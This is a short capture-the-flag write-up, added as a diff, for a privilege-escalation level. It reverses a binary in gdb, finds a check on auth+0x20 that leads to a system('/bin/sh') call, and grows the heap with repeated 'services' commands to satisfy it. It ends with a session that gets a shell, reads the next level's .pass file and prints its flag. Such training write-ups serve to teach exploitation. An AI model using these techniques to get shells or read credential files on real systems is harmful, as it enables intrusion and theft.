@@ -1,0 +1,39 @@
+# When reversing the binary, i found those lines:
+
+0x080486e2 <+382>:	mov    eax,ds:0x8049aac
+0x080486e7 <+387>:	mov    eax,DWORD PTR [eax+0x20]
+0x080486ea <+390>:	test   eax,eax
+0x080486ec <+392>:	je     0x80486ff <main+411>
+system(/bin/sh);
+[...]
+
+# We must not take this jump, eax must be != 0
+# Let's find which data is checked
+(gdb) x/x 0x8049aac
+0x8049aac <auth>
+
+# Well, this is our auth variable...
+
+# Our assembly code is checking auth+0x20 (32)
+# auth = 0x804a008 after initializing it
+# 0x0804a008 + 0x20 = 0x0804a028
+# So we must write something at this address
+
+# When calling "services", it'll grow our heap by calling strdup
+# So our goal is to grow the heap enough to write at auth+32 (0x0804a028)
+
+===============================================================================
+
+level8@SnowCrash:~$ ./level8
+(nil), (nil)
+auth
+0x804a008, (nil)
+services
+0x804a008, 0x804a018
+services
+0x804a008, 0x804a028 # Here we are, let's call login to check
+login
+$ whoami
+level9
+$ cat /home/user/level9/.pass
+c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
